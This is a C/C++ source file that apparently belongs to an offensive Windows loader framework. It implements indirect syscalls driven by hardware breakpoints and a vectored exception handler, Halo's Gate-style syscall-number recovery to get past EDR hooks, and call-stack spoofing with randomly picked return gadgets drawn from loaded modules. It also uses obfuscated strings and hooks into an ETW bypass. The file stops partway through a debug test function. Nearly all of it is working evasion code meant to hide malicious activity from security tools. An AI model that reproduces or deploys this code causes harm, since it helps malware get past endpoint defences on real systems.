#include "../include/utils.h"
#include "../libs/bastia/bastia.h"
#include "../include/syscalls.h"
#include "../include/resolver.h"
#include "../include/etw_bypass.h"

/* INDIRECT SYSCALLS : */

// ── Architecture-specific register & pattern abstraction ────────
#ifdef _WIN64
#define CTX_IP(ctx)     ((ctx)->Rip)
#define CTX_SP(ctx)     ((ctx)->Rsp)
#define CTX_ARG1(ctx)   ((ctx)->Rcx)
#define CTX_ARG5(ctx)   ((ctx)->R10)
#define CTX_RET(ctx)    ((ctx)->Rax)
#define CTX_DR(ctx, n)  ((ctx)->Dr ## n)
#define CTX_SYSCALL_ARG(ctx) ((ctx)->R10)

#define HALOS_GATE_SIG   { 0x4C, 0x8B, 0xD1, 0xB8 }
#define HALOS_GATE_SIG_LEN 4
#define HALOS_GATE_SIG_MASK "xxxx"

#define SYSCALL_INSN_SIG  { 0x0F, 0x05 }
#define SYSCALL_INSN_LEN 2

#define GADGET_PREFIX_BYTES 2
#define GADGET_IMM8_OFFSET 3
#define GADGET_LEN         5

#define STACK_SLOT_SIZE   8
#define STACK_SPOOF_SLOTS 5

// SSN byte offsets: x64 prologue 4C 8B D1 B8 [low] [high]
#define SSN_LOW_OFFSET  4
#define SSN_HIGH_OFFSET 5

#else // x86
#define CTX_IP(ctx)     ((ctx)->Eip)
#define CTX_SP(ctx)     ((ctx)->Esp)
#define CTX_ARG1(ctx)   ((ctx)->Ecx)
#define CTX_ARG5(ctx)   ((ctx)->Edx)
#define CTX_RET(ctx)    ((ctx)->Eax)
#define CTX_DR(ctx, n)  ((ctx)->Dr ## n)
#define CTX_SYSCALL_ARG(ctx) ((ctx)->Edx)

#define HALOS_GATE_SIG   { 0x8B, 0xD4 }
#define HALOS_GATE_SIG_LEN 2
#define HALOS_GATE_SIG_MASK "xx"

#define SYSCALL_INSN_SIG  { 0x0F, 0x34 }
#define SYSCALL_INSN_LEN 2

#define GADGET_PREFIX_BYTES 1
#define GADGET_IMM8_OFFSET 2
#define GADGET_LEN         4

#define STACK_SLOT_SIZE   4
#define STACK_SPOOF_SLOTS 5

// SSN byte offsets within the syscall prologue (after HALOS_GATE_SIG match)
// x64: 4C 8B D1 B8 [low] [high] ... -> low at +4, high at +5
// x86: 8B D4 B8 [low] [high] ...     -> low at +3, high at +4
#define SSN_LOW_OFFSET  3
#define SSN_HIGH_OFFSET 4
#endif

static functionTable* g_functionTable = nullptr;
static bool InitHWSyscalls(void);
static ULONG_PTR PrepareSyscall(char* functionName);
static const char* g_custom_pivot = nullptr;

extern "C" void setSyscallPivot(const char* pivot) {
    g_custom_pivot = pivot;
}

extern "C"
bool initSyscalls(SYSCALLS_ID ID) {
    g_functionTable = InitializeFunctionTable(true, false, false, false);

    if (!g_functionTable) {
        // Cannot use g_functionTable when it's null, so we exit gracefully
        // cute null ptr execution:
        g_debugPrint("[!] InitializeFunctionTable failed - cannot proceed with syscall initialization");
        return false;
    }

    SIZE_T syscallsCtxSize = sizeof(I_SYSCALLS_CTX);
    PI_SYSCALLS_CTX syscallsCtx = NULL;

    NTSTATUS status = g_functionTable->NtAllocateVirtualMemory(
        NtCurrentProcess(),
        (PVOID*)&syscallsCtx,
        0,
        &syscallsCtxSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status) || !syscallsCtx) {
        g_debugPrint("[!] Failed to allocate memory for syscalls_ctx");
        // No cleanup needed here as g_functionTable is valid and will be cleaned up by caller
        return false;
    }

    __memset(syscallsCtx, 0, syscallsCtxSize);

    // Assign to the function table
    g_functionTable->parameters.syscalls_ctx = syscallsCtx;

    g_debugPrint("Trying to initialize syscalls with ID %i", (int)ID);

    bool result = false;
    switch(ID) {
        case SYSCALLS_ID::HWSYSCALLS:
            result = InitHWSyscalls();
            break;

        case SYSCALLS_ID::UNDEFINED:
        default:
            g_debugPrint("[!] Unsupported or undefined syscall method: %i", (int)ID);
            result = false;
            break;
    }

    if (!result) {
        g_debugPrint("[!] Syscall initialization failed, cleaning up resources");
        // Clean up the syscall context we allocated
        if (g_functionTable->parameters.syscalls_ctx) {
            g_functionTable->NtFreeVirtualMemory(NtCurrentProcess(),
                (PVOID*)&g_functionTable->parameters.syscalls_ctx, NULL, MEM_RELEASE);
            g_functionTable->parameters.syscalls_ctx = NULL;
        }
    } else {
        g_debugPrint("[+] Syscalls initialized successfully");
    }

    return result;
}

/* ---------- randomized RET gadget collection ---------- */
/*
 * CollectRetGadgets() walks the PEB LDR to enumerate ALL loaded modules,
 * scans their executable sections for 'add rsp, imm8; ret' patterns,
 * and populates ctx->gadgetTable[] with up to MAX_RET_GADGETS entries.
 *
 * PickRandomGadget() selects one at random (TSC-derived index) on each
 * syscall dispatch, and the VEH Phase3 handler sizes the spoofed stack
 * frame to match the chosen gadget's imm8 value.
 *
 * This defeats the static signature of a fixed return address on the stack.
 */

/* ---------- gadget collection & selection ---------- */

/*
 * Enumerate loaded modules via the PEB LDR.
 */
#define MAX_ENUM_MODULES 256

static int getLoadedModules(PVOID* outBases, PUNICODE_STRING* outNames, int maxCount) {
    int count = 0;
    PPEB peb = getCurrentPEB();
    if (!peb || !peb->LoaderData) return 0;

    LIST_ENTRY* head = &peb->LoaderData->InLoadOrderModuleList;
    LIST_ENTRY* cur  = head->Flink;

    while (cur != head && count < maxCount) {
        PLDR_DATA_TABLE_ENTRY entry =
            CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        cur = cur->Flink;

        /* Skip the first entry - that's our own image. Useless for gadget hunting. */
        if (count == 0) { count++; continue; }  /* skip self, still advance */

        if (!entry->DllBase || !entry->BaseDllName.Buffer)
            continue;

        outBases[count - 1] = entry->DllBase;        /* shift: [0] = second module */
        outNames[count - 1] = &entry->BaseDllName;
        count++;
    }
    /* Return count excluding the skipped self entry */
    return (count > 0) ? count - 1 : 0;
}

/* Gadget patterns: 'add rsp, imm8; ret' for various immediate values */
#ifdef _WIN64
static const BYTE g_gadgetPatterns[][5] = {
    {0x48,0x83,0xC4,0x08,0xC3},   /* add rsp,08 ; ret */
    {0x48,0x83,0xC4,0x10,0xC3},   /* add rsp,10 ; ret */
    {0x48,0x83,0xC4,0x18,0xC3},   /* add rsp,18 ; ret */
    {0x48,0x83,0xC4,0x20,0xC3},   /* add rsp,20 ; ret */
    {0x48,0x83,0xC4,0x28,0xC3},   /* add rsp,28 ; ret */
    {0x48,0x83,0xC4,0x30,0xC3},   /* add rsp,30 ; ret */
    {0x48,0x83,0xC4,0x38,0xC3},   /* add rsp,38 ; ret */
    {0x48,0x83,0xC4,0x40,0xC3},   /* add rsp,40 ; ret */
    {0x48,0x83,0xC4,0x48,0xC3},   /* add rsp,48 ; ret */
    {0x48,0x83,0xC4,0x50,0xC3},   /* add rsp,50 ; ret */
    {0x48,0x83,0xC4,0x58,0xC3},   /* add rsp,58 ; ret */
    {0x48,0x83,0xC4,0x60,0xC3},   /* add rsp,60 ; ret */
    {0x48,0x83,0xC4,0x68,0xC3},   /* add rsp,68 ; ret */
    {0x48,0x83,0xC4,0x70,0xC3},   /* add rsp,70 ; ret */
    {0x48,0x83,0xC4,0x78,0xC3},   /* add rsp,78 ; ret */
    {0x48,0x83,0xC4,0x80,0xC3},   /* add rsp,80 ; ret */
};
#else
static const BYTE g_gadgetPatterns[][4] = {
    {0x83,0xC4,0x08,0xC3},   /* add esp,08 ; ret */
    {0x83,0xC4,0x10,0xC3},   /* add esp,10 ; ret */
    {0x83,0xC4,0x18,0xC3},   /* add esp,18 ; ret */
    {0x83,0xC4,0x20,0xC3},   /* add esp,20 ; ret */
    {0x83,0xC4,0x28,0xC3},   /* add esp,28 ; ret */
    {0x83,0xC4,0x30,0xC3},   /* add esp,30 ; ret */
    {0x83,0xC4,0x38,0xC3},   /* add esp,38 ; ret */
    {0x83,0xC4,0x40,0xC3},   /* add esp,40 ; ret */
    {0x83,0xC4,0x48,0xC3},   /* add esp,48 ; ret */
    {0x83,0xC4,0x50,0xC3},   /* add esp,50 ; ret */
    {0x83,0xC4,0x58,0xC3},   /* add esp,58 ; ret */
    {0x83,0xC4,0x60,0xC3},   /* add esp,60 ; ret */
    {0x83,0xC4,0x68,0xC3},   /* add esp,68 ; ret */
    {0x83,0xC4,0x70,0xC3},   /* add esp,70 ; ret */
    {0x83,0xC4,0x78,0xC3},   /* add esp,78 ; ret */
    {0x83,0xC4,0x80,0xC3},   /* add esp,80 ; ret */
};
#endif
#define GADGET_PATTERN_COUNT (sizeof(g_gadgetPatterns) / sizeof(g_gadgetPatterns[0]))

/*
 * Scan a single module's RX sections for gadget patterns.
 * Requires both IMAGE_SCN_MEM_EXECUTE and IMAGE_SCN_CNT_CODE
 * i.e. genuine executable code sections, not data or relocations.
 */
static void scanModuleForGadgets(PVOID moduleBase, PI_SYSCALLS_CTX ctx,
                                  PCWSTR moduleName) {
    if (!moduleBase || !ctx || ctx->gadgetCount >= MAX_RET_GADGETS)
        return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections && ctx->gadgetCount < MAX_RET_GADGETS; i++) {
        /* Must be RX section */
        DWORD chars = sec[i].Characteristics;
        if (!(chars & IMAGE_SCN_MEM_EXECUTE) ||
            !(chars & IMAGE_SCN_MEM_READ))
            continue;

        BYTE* sectionStart = (BYTE*)moduleBase + sec[i].VirtualAddress;
        DWORD sectionSize  = (sec[i].SizeOfRawData > sec[i].Misc.VirtualSize)
                             ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
        if (sectionSize == 0) continue;

        /* Try each pattern across this section */
        for (DWORD off = 0; off + GADGET_LEN <= sectionSize && ctx->gadgetCount < MAX_RET_GADGETS; off++) {
            for (UINT p = 0; p < GADGET_PATTERN_COUNT; p++) {
                bool match = true;
                for (int b = 0; b < GADGET_LEN; b++) {
                    if (sectionStart[off + b] != g_gadgetPatterns[p][b]) {
                        match = false;
                        break;
                    }
                }
                if (match) {
                    /* Found a gadget - deduplicate */
                    ULONG_PTR addr = (ULONG_PTR)(sectionStart + off);
                    bool dup = false;
                    for (int g = 0; g < ctx->gadgetCount; g++) {
                        if (ctx->gadgetTable[g].addr == addr) {
                            dup = true;
                            break;
                        }
                    }
                    if (!dup) {
                        ctx->gadgetTable[ctx->gadgetCount].addr = addr;
                        ctx->gadgetTable[ctx->gadgetCount].imm8 = g_gadgetPatterns[p][GADGET_IMM8_OFFSET];
                        ctx->gadgetCount++;

                        g_debugPrint("[+] Gadget #%d: add rsp,0x%02X;ret @ 0x%p (%ls)",
                                     ctx->gadgetCount - 1,
                                     g_gadgetPatterns[p][GADGET_IMM8_OFFSET],
                                     (void*)addr,
                                     moduleName ? moduleName : L"???");

                        if (ctx->gadgetCount >= MAX_RET_GADGETS)
                            return;
                    }
                    break;  /* one match per offset, move on */
                }
            }
        }
    }
}

/*
 * Collect randomized RET gadgets from ALL loaded modules (excluding self).
 * Replaces the old FindRetGadget() which hardcoded kernel32/kernelbase.
 */
static bool CollectRetGadgets(PI_SYSCALLS_CTX ctx) {
    if (!ctx) return false;

    PVOID  bases[MAX_ENUM_MODULES];
    PUNICODE_STRING names[MAX_ENUM_MODULES];
    int modCount = getLoadedModules(bases, names, MAX_ENUM_MODULES);

    if (modCount == 0) {
        g_debugPrint("[-] CollectRetGadgets: no modules found in PEB");
        return false;
    }

    g_debugPrint("[+] Enumerated %d loaded modules (self excluded) - scanning for gadgets...", modCount);

    for (int i = 0; i < modCount && ctx->gadgetCount < MAX_RET_GADGETS; i++) {
        PCWSTR name = names[i] ? names[i]->Buffer : NULL;
        scanModuleForGadgets(bases[i], ctx, name);
    }

    if (ctx->gadgetCount < 2) {
        g_debugPrint("[-] CollectRetGadgets: only found %d gadgets, need at least 2",
                     ctx->gadgetCount);
        return false;
    }

    g_debugPrint("[+] Collected %d unique RET gadgets from loaded modules",
                 ctx->gadgetCount);
    return true;
}

/*
 * Pick a random gadget from the collected table using TSC-derived selection.
 * Returns the chosen gadget's address; the caller reads imm8 separately
 * from the same table entry for correct stack-frame sizing.
 */
static ULONG_PTR PickRandomGadget(PI_SYSCALLS_CTX ctx, UINT8* outImm8) {
    if (!ctx || ctx->gadgetCount == 0) return 0;

    /* Use RDTSC + fold for selection (not crypto-grade, fine for index) */
    UINT64 tsc = ___rdtsc();
    int index = (int)((UINT32)tsc % ctx->gadgetCount);

    if (outImm8) *outImm8 = ctx->gadgetTable[index].imm8;
    return ctx->gadgetTable[index].addr;
}


// @janoglezcampos, @idov31 - https://github.com/Idov31/Cronos/blob/master/src/Utils.c
static BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
    for (; *szMask; ++szMask, ++pData, ++bMask){
        if (*szMask == 'x' && *pData != *bMask) {
            return FALSE;
        }
    }
    return TRUE;
}

static DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask) {
    for (DWORD i = 0; i < dwLen; i++){
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask)) {
            return (DWORD_PTR)(dwAddress + i);
        }
    }
    return 0;
}

/* Halos gate */

static const BYTE kHalosGateSig[] = HALOS_GATE_SIG;
static const BYTE kSyscallInsnSig[] = SYSCALL_INSN_SIG;

ULONG_PTR FindSyscallNumber(ULONG_PTR functionAddress) {
    WORD syscallNumber = 0;

    for (WORD idx = 1; idx <= 500; idx++) {
        if (__memcmp((PBYTE)(functionAddress + idx * DOWN),
                     kHalosGateSig, HALOS_GATE_SIG_LEN) == 0) {
            BYTE high = *((PBYTE)functionAddress + SSN_HIGH_OFFSET + idx * DOWN);
            BYTE low = *((PBYTE)functionAddress + SSN_LOW_OFFSET + idx * DOWN);
            syscallNumber = ((high << 8) | low) - idx;
            g_debugPrint("[+] Found SSN: 0x%X", syscallNumber);
            break;
        }

        if (__memcmp((PBYTE)(functionAddress + idx * UP),
                     kHalosGateSig, HALOS_GATE_SIG_LEN) == 0) {
            BYTE high = *((PBYTE)functionAddress + SSN_HIGH_OFFSET + idx * UP);
            BYTE low = *((PBYTE)functionAddress + SSN_LOW_OFFSET + idx * UP);
            syscallNumber = ((high << 8) | low) + idx;
            g_debugPrint("[+] Found SSN: 0x%X", syscallNumber);
            break;
        }
    }

    if (syscallNumber == 0) {
        g_debugPrint("[-] Could not find SSN");
    }

    return syscallNumber;
}

ULONG_PTR FindSyscallReturnAddress(ULONG_PTR functionAddress, WORD syscallNumber) {
    ULONG_PTR syscallReturnAddress = 0;

    for (WORD idx = 1; idx <= 32; idx++) {
        if (__memcmp((PBYTE)functionAddress + idx, kSyscallInsnSig, SYSCALL_INSN_LEN) == 0) {
            syscallReturnAddress = (ULONG_PTR)((PBYTE)functionAddress + idx);
            g_debugPrint("[+] Found \"syscall;ret;\" opcode address: 0x%p", (void*)syscallReturnAddress);
            break;
        }
    }

    if (syscallReturnAddress == 0) {
        g_debugPrint("[-] Could not find \"syscall;ret;\" opcode address");
    }
    return syscallReturnAddress;
}


/*
    DO NOT EDIT!
        __attribute__((optnone))
    is required to make sure functionName lands in rcx.
    Otherwise, it gets optimised to stack (unsure).
*/

__attribute__((optnone))
static ULONG_PTR PrepareSyscall(char* functionName) {
    // ctx is always valid after initHWSyscalls
    // Dr0 breakpoint on this function address triggers VEH Phase1 to fill ntFunctionAddress
    // After VEH advances RIP, this returns the real NT stub address
    return g_functionTable->parameters.syscalls_ctx->ntFunctionAddress;
}

static bool SetMainBreakpoint(void) {
    if (!g_functionTable || !g_functionTable->parameters.syscalls_ctx) {
        g_debugPrint("[-] Table/ctx NULL - cannot set HWBP");
        return false;
    }

    PI_SYSCALLS_CTX ctx = g_functionTable->parameters.syscalls_ctx;

    ULONG_PTR ntdllBase = (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
    ctx->pivotApiAddr = GetSymbolAddress(ntdllBase, g_custom_pivot);

    if (!ctx->pivotApiAddr) {
        g_debugPrint("[-] Failed to resolve pivot API");
        return false;
    }
    g_debugPrint("[+] Pivot API: 0x%p", (void*)ctx->pivotApiAddr);
    ULONG_PTR k32Base  = (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"kernel32.dll"));

    ctx->threadInitThunkRetAddr = GetSymbolAddress(k32Base, lcg_encrypt("BaseThreadInitThunk")) + 0x14;
    ctx->rtlUserThreadStartAddr = GetSymbolAddress(ntdllBase, lcg_encrypt("RtlUserThreadStart")) + 0x21;
    g_debugPrint("BaseThreadInitThunk address: %p", ctx->threadInitThunkRetAddr);
    g_debugPrint("RtlUserThreadStart address: %p", ctx->rtlUserThreadStartAddr);
    
    CONTEXT threadCtx = { 0 };
    threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!g_functionTable->GetThreadContext(ctx->myThread, &threadCtx)) {
        g_debugPrint("[-] GetThreadContext failed");
        return false;
    }

    // Hard-zero everything first to avoid leftover garbage Dr state
    threadCtx.Dr0 = (ULONG_PTR)&PrepareSyscall;
    threadCtx.Dr1 = 0;  // Set dynamically in VEH Phase 1
    threadCtx.Dr2 = 0;
    threadCtx.Dr3 = 0;
    threadCtx.Dr6 = 0;
    threadCtx.Dr7 = 0;
    threadCtx.Dr7 |=  (1 << 0);   // Enable Dr0 local
    threadCtx.Dr7 &= ~(1 << 16);  // Condition bits 16-17 = 00 (execute)
    threadCtx.Dr7 &= ~(1 << 17);
    threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!g_functionTable->SetThreadContext(ctx->myThread, &threadCtx)) {
        g_debugPrint("[-] SetThreadContext failed");
        return false;
    }

    g_debugPrint("[+] Dr0 set to PrepareSyscall (0x%p), Dr1 idle",
                 (void*)&PrepareSyscall);
    return true;
}


/*
    VEH Handler:
   - Phase1: disarm Dr0 after caching (prevents re-trigger on same call)
   - Phase3 full_cleanup: NO re-arming of Dr0 (prevents loop on next call)
   - Added explicit RIP advancement in Phase1 to skip PrepareSyscall body
   - Clear Dr7 more comprehensively to avoid stray single-step traps */
LONG WINAPI HWSyscallExceptionHandler(struct _EXCEPTION_POINTERS *ExceptionInfo) {
    if (!ExceptionInfo || !ExceptionInfo->ExceptionRecord || !ExceptionInfo->ContextRecord ||
        !g_functionTable || !g_functionTable->parameters.syscalls_ctx) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (ExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PI_SYSCALLS_CTX ctx = g_functionTable->parameters.syscalls_ctx;
    PCONTEXT regs = ExceptionInfo->ContextRecord;

    LONG etwResult = {};

    // ===================================================
    // PHASE 1: Dr0 @ PrepareSyscall ENTRY (RCX=function name)
    // ===================================================
    if (CTX_IP(regs) == (ULONG_PTR)&PrepareSyscall) {
        if (!CTX_ARG1(regs)) {
            g_debugPrint("[-] Phase1: RCX NULL");
            goto cleanup_and_continue_search;
        }

        ctx->ntFunctionAddress = GetSymbolAddress(
            (ULONG_PTR)GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll")),
            (const char*)CTX_ARG1(regs));

        if (!ctx->ntFunctionAddress) {
            g_debugPrint("[-] Phase1: Resolve failed '%s'", (char*)CTX_ARG1(regs));
            goto cleanup_and_continue_search;
        }

        ctx->cachedSSN = FindSyscallNumber(ctx->ntFunctionAddress);
        if (!ctx->cachedSSN) {
            g_debugPrint("[-] Phase1: SSN failed");
            goto cleanup_and_continue_search;
        }

        ctx->cachedSyscallRetAddr = FindSyscallReturnAddress(
            ctx->ntFunctionAddress, (WORD)ctx->cachedSSN);
        if (!ctx->cachedSyscallRetAddr) {
            g_debugPrint("[-] Phase1: syscall;ret failed");
            goto cleanup_and_continue_search;
        }

        g_VERBOSE("[+] Phase1 '%s': SSN=0x%p ret=0x%p",
                     (char*)CTX_ARG1(regs),
                     (void*)ctx->cachedSSN,
                     (void*)ctx->cachedSyscallRetAddr);

        // DISARM Dr0 - no more breakpoints on PrepareSyscall for this invocation
        CTX_DR(regs, 0) = 0;
        regs->Dr7 &= ~(1 << 0);           // L0=0
        regs->Dr7 &= ~((3 << 16) | (3 << 18)); // Clear R/W0 + LEN0

        // Set Dr1 -> ntFunctionAddress (for Phase 2)
        CTX_DR(regs, 1) = ctx->ntFunctionAddress;
        regs->Dr7 |=  (1 <<  2);  // L1=1 (Dr1 local enable)
        regs->Dr7 &= ~(1 <<  3);  // G1=0 (Dr1 not global)
        regs->Dr7 &= ~(3 << 20);  // R/W1=00 (Dr1 execute)
        regs->Dr7 &= ~(3 << 22);  // LEN1=00 (Dr1 byte size)

        // In Phase1 - simulate PrepareSyscall doing a normal `ret`
        CTX_RET(regs) = ctx->ntFunctionAddress;
        CTX_IP(regs) = *(ULONG_PTR*)(ULONG_PTR)CTX_SP(regs);
        CTX_SP(regs) += STACK_SLOT_SIZE;

        regs->Dr6 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ===================================================
    // PHASE 2: Dr1 @ ntFunctionAddress ENTRY (RCX=REAL ARG1)
    // ===================================================
    if (CTX_IP(regs) == ctx->ntFunctionAddress) {
        g_VERBOSE("[+] Phase2: NT stub entry - args live");

        // Halos Gate hook detection
        ULONG_PTR funcAddr = CTX_IP(regs);
        if (!FindPattern(funcAddr, HALOS_GATE_SIG_LEN,
                         (PBYTE)kHalosGateSig, (PCHAR)HALOS_GATE_SIG_MASK)) {
            g_debugPrint("[+] Phase2: HOOKED - Halos Gate");

            WORD hgSSN = (WORD)FindSyscallNumber(funcAddr);
            if (hgSSN == 0) {
                g_debugPrint("[-] Phase2: HG SSN failed - fallback to hook");
                goto phase2_cleanup;
            }

            ULONG_PTR hgRetAddr = FindSyscallReturnAddress(funcAddr, hgSSN);
            if (!hgRetAddr) {
                g_debugPrint("[-] Phase2: HG ret failed");
                goto phase2_cleanup;
            }

            ctx->cachedSSN = hgSSN;
            ctx->cachedSyscallRetAddr = hgRetAddr;
            g_debugPrint("[+] Phase2: HG SSN=0x%X ret=0x%p",
                         hgSSN, (void*)hgRetAddr);
        }
        g_VERBOSE("Found pattern! We are not hooked.");

        // Move to Phase 3: Dr1 -> pivot, Rip -> pivot
        regs->Dr6 = 0;
        CTX_DR(regs, 1) = ctx->pivotApiAddr;
        CTX_IP(regs) = ctx->pivotApiAddr;
        return EXCEPTION_CONTINUE_EXECUTION;

    phase2_cleanup:
        CTX_DR(regs, 1) = 0;
        regs->Dr7 &= ~(1 << 2);  // L1=0
        regs->Dr7 &= ~((3<<20) | (3<<22)); // Clear Dr1 R/W1 + LEN1
        regs->Dr6 = 0;
        ctx->cachedSSN = ctx->cachedSyscallRetAddr = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // ===================================================
    // PHASE 3: Dr1 @ pivotApiAddr ENTRY (stack legit, args intact)
    // ===================================================
    if (CTX_IP(regs) == ctx->pivotApiAddr) {
        g_VERBOSE("[+] Phase3: Pivot - spoofing frame");

        {   /* scope for gadget variables (avoid goto bypass) */
        UINT8 gadgetImm8 = 0x68;  /* fallback: 0x68 = 104 bytes */
        ULONG_PTR gadgetAddr = 0;

        if (ctx->gadgetCount == 0 || !ctx->cachedSSN || !ctx->cachedSyscallRetAddr) {
            g_debugPrint("[-] Phase3: Missing cached data (gadgets=%d, ssn=0x%p, ret=0x%p)",
                         ctx->gadgetCount,
                         (void*)ctx->cachedSSN,
                         (void*)ctx->cachedSyscallRetAddr);
            goto full_cleanup;
        }

        /* Pick a random gadget for this invocation - defeats static signature */
        gadgetAddr = PickRandomGadget(ctx, &gadgetImm8);
        if (!gadgetAddr) {
            g_debugPrint("[-] Phase3: PickRandomGadget failed");
            goto full_cleanup;
        }

        /* Stack spoof - frame size matches the gadget's 'add rsp, imm8' */
        CTX_SP(regs) -= gadgetImm8;
        *(ULONG_PTR*)(ULONG_PTR)CTX_SP(regs) = gadgetAddr;
        for (size_t idx = 0; idx < STACK_ARGS_LENGTH; ++idx) {
            size_t offset = idx * STACK_SLOT_SIZE + STACK_ARGS_RSP_OFFSET;
            *(ULONG_PTR*)(CTX_SP(regs) + offset) =
                *(ULONG_PTR*)(CTX_SP(regs) + offset + gadgetImm8);
        }

        // Syscall dispatch (ntdll origin)
        CTX_SYSCALL_ARG(regs) = CTX_ARG1(regs);
        CTX_RET(regs) = ctx->cachedSSN;
        CTX_IP(regs) = ctx->cachedSyscallRetAddr;

        g_VERBOSE("[+] Phase3: syscall from ntdll!0x%p SSN=0x%p gadget=0x%p(imm=0x%02X)",
                     (void*)ctx->cachedSyscallRetAddr,
                     (void*)ctx->cachedSSN,
                     (void*)gadgetAddr,
                     gadgetImm8);
        }

    full_cleanup:
        g_VERBOSE("Entered full_cleanup...");
        CTX_DR(regs, 0) = (ULONG_PTR)&PrepareSyscall;
        CTX_DR(regs, 1) = CTX_DR(regs, 2) = CTX_DR(regs, 3) = 0;
        regs->Dr6 = 0;
        regs->Dr7 = 0;
        regs->Dr7 |= (1 << 0);  // L0=1, execute condition (bits 16-17 = 00, already clear)

        ctx->cachedSSN = ctx->cachedSyscallRetAddr = 0;
        ctx->ntFunctionAddress = 0;
        return EXCEPTION_CONTINUE_EXECUTION;

    }

    g_debugPrint("[-] Unexpected RIP=0x%p", (void*)CTX_IP(regs));

    // Try ETW handler (check if HWBP hit on NtTraceEvent)
    etwResult = ETW_HandleException(ExceptionInfo);
    if (etwResult == EXCEPTION_CONTINUE_EXECUTION) {
        return etwResult;
    }

cleanup_and_continue_search:
    return EXCEPTION_CONTINUE_SEARCH;
}





//LONG __stdcall HWSyscallExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {

static bool InitHWSyscalls(void) {
    /* cache the thread handle */
    g_functionTable->parameters.syscalls_ctx->myThread = NtCurrentThread();

    /* collect randomized RET gadgets from all loaded modules */
    if (!CollectRetGadgets(g_functionTable->parameters.syscalls_ctx)) {
        g_functionTable->NtTerminateProcess(NtCurrentProcess(), 4);
        g_debugPrint("[!] Could not collect RET gadgets. Initialization failed.");
        return false;
    }

    /* 4. install the VEH */
    g_debugPrint("Installing VEH to %p via RtlAddVectoredExceptionHandler (%p)", 
                 HWSyscallExceptionHandler, g_functionTable->RtlAddVectoredExceptionHandler);
    g_functionTable->parameters.syscalls_ctx->exceptionHandlerHandle =
        g_functionTable->RtlAddVectoredExceptionHandler(true, HWSyscallExceptionHandler);

    if (!g_functionTable->parameters.syscalls_ctx->exceptionHandlerHandle) {
        g_debugPrint("[!] Could not register VEH: 0x%lX", g_functionTable->GetLastError());
        return false;
    }
    g_debugPrint("VEH successfully installed to %p!", &HWSyscallExceptionHandler);

    /* 5. set the initial hardware breakpoint */
    return SetMainBreakpoint();
}

bool DeinitHWSyscalls(functionTable* funcTable) {
    debugPrint("Removing VEH...");

    if (!funcTable) {
        debugPrint("Warning: funcTable is NULL");
        return true;
    }

    if (!funcTable->parameters.syscalls_ctx) {
        debugPrint("Warning: syscalls_ctx is NULL - already cleaned up or never initialized");
        return true;
    }

    if (!funcTable->RtlRemoveVectoredExceptionHandler) {
        debugPrint("Warning: RtlRemoveVectoredExceptionHandler is NULL");
        return false;
    }

    if (!funcTable->NtFreeVirtualMemory) {
        debugPrint("Warning: NtFreeVirtualMemory is NULL");
        return false;
    }

    // Remove the exception handler first
    if (funcTable->parameters.syscalls_ctx->exceptionHandlerHandle) {
        funcTable->RtlRemoveVectoredExceptionHandler(funcTable->parameters.syscalls_ctx->exceptionHandlerHandle);
        funcTable->parameters.syscalls_ctx->exceptionHandlerHandle = NULL;
    }

    // Free the allocated syscalls_ctx memory
    SIZE_T size = sizeof(I_SYSCALLS_CTX);
    NTSTATUS status = funcTable->NtFreeVirtualMemory(NtCurrentProcess(),
        (PVOID*)&funcTable->parameters.syscalls_ctx, &size, MEM_RELEASE);

    if (!NT_SUCCESS(status)) {
        debugPrint("Warning: Failed to free syscalls_ctx memory, status: 0x%08X", status);
        return false;
    }

    funcTable->parameters.syscalls_ctx = NULL;
    debugPrint("Successfully cleaned up HWSyscalls");

    return true;
}

#ifdef DEBUG

bool testSyscalls(void) {
    return testSyscalls(g_functionTable);
}

bool testSyscalls(functionTable* funcTable) {
    HANDLE targetHandle = NULL;
    OBJECT_ATTRIBUTES object = {};
    object.Length = sizeof(OBJECT_ATTRIBUTES);
    object.ObjectName = NULL;
    object.Attributes = NULL;
    object.RootDirectory = NULL;
    object.SecurityDescriptor = NULL;
    NTSTATUS status = 0;
    HANDLE sectionHandle = NULL;
    LARGE_INTEGER sectionSize = {};
    sectionSize.LowPart = 450;

    bool SUCCESS = false;

    // Get current process ID instead of using command line argument
    HANDLE pid = __getCurrentProcessID();
    CLIENT_ID clientID = { pid, NULL };

    debugPrint("[+] Testing syscall preparation and execution with current process (PID: %p)", pid);

    status = syscallNtOpenProcess(&targetHandle, PROCESS_ALL_ACCESS, &object, &clientID);
    debugPrint("[+] NtOpenProcess result: 0x%08X", status);

    if (NT_SUCCESS(status) && targetHandle) {
        debugPrint("[+] Successfully opened current process handle: %p", targetHandle);
        // Close the handle since we're just testing
        if (funcTable && funcTable->NtClose) {
            funcTable->NtClose(targetHandle);
            targetHandle = NULL;
        }
        SUCCESS = true;
    } else {
        return SUCCESS;
    }

